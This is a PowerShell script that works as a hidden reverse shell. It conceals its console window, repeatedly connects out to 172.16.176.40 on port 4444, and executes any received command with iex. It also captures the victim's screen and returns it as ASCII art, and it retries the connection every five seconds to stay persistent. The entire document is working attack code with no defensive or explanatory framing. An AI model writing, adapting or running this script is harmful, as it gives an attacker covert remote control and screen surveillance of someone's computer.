$m = Add-Type -Name Win32 -MemberDefinition @'[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'@ -PassThru
$m::ShowWindow((Get-Process -Id $PID).MainWindowHandle, 0)

# 2. Aliases
if (-not (Get-Command touch -ErrorAction SilentlyContinue)) { New-Alias -Name touch -Value New-Item -Force }

while($true) {
    try {
        $c = New-Object System.Net.Sockets.TCPClient('172.16.176.40', 4444)
        $s = $c.GetStream(); $e = New-Object System.Text.UTF8Encoding
        $p = $e.GetBytes("`n[+] Visual Shell Active. Commands: 'screenshot', 'kill'`nPS $PWD> ")
        $s.Write($p, 0, $p.Length)

        [byte[]]$b = New-Object byte[] 65535
        while(($i = $s.Read($b, 0, $b.Length)) -ne 0) {
            $input = $e.GetString($b, 0, $i).Trim()
            $out = ""

            if ($input -eq 'kill') { Stop-Process -Id $PID -Force } 
            
            elseif ($input -eq 'screenshot') {
                try {
                    Add-Type -AssemblyName System.Windows.Forms, System.Drawing
                    
                    # Get actual screen bounds
                    $screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                    $width = $screen.Width
                    $height = $screen.Height
                    
                    # 1. Capture full screen first
                    $mainBmp = New-Object System.Drawing.Bitmap $width, $height
                    $g = [System.Drawing.Graphics]::FromImage($mainBmp)
                    $g.CopyFromScreen($screen.X, $screen.Y, 0, 0, $mainBmp.Size)
                    
                    # 2. Scale down for ASCII (Width 100 is standard terminal)
                    $asciiW = 100
                    $asciiH = [int]($asciiW * ($height / $width) * 0.5)
                    $smallBmp = New-Object System.Drawing.Bitmap $asciiW, $asciiH
                    $g2 = [System.Drawing.Graphics]::FromImage($smallBmp)
                    $g2.DrawImage($mainBmp, 0, 0, $asciiW, $asciiH)
                    
                    # 3. Build ASCII String
                    $ascii = "`n--- REMOTE VIEW ($width x $height) ---`n"
                    # Char map from darkest to lightest
                    $ramp = "#","W","M","B","@","q","o","*","+","-",":","."," "
                    
                    for ($y=0; $y -lt $asciiH; $y++) {
                        for ($x=0; $x -lt $asciiW; $x++) {
                            $pColor = $smallBmp.GetPixel($x, $y)
                            $brightness = ($pColor.R + $pColor.G + $pColor.B) / 3
                            # Map 0-255 brightness to 0-12 index
                            $index = [int][Math]::Floor(($brightness / 255) * ($ramp.Length - 1))
                            $ascii += $ramp[$index]
                        }
                        $ascii += "`n"
                    }
                    $out = $ascii + "--- END VIEW ---`n"
                    
                    # Cleanup memory
                    $g.Dispose(); $g2.Dispose(); $mainBmp.Dispose(); $smallBmp.Dispose()
                } catch { $out = "[!] Screenshot Error: $($_.Exception.Message)`n" }
            }
            else {
                $out = try { if ($input) { iex $input 2>&1 | Out-String } } catch { $_.Exception.Message }
            }

            $resp = $e.GetBytes($out + "PS $PWD> ")
            $s.Write($resp, 0, $resp.Length); $s.Flush()
        }
    } catch { Start-Sleep 5 }
}
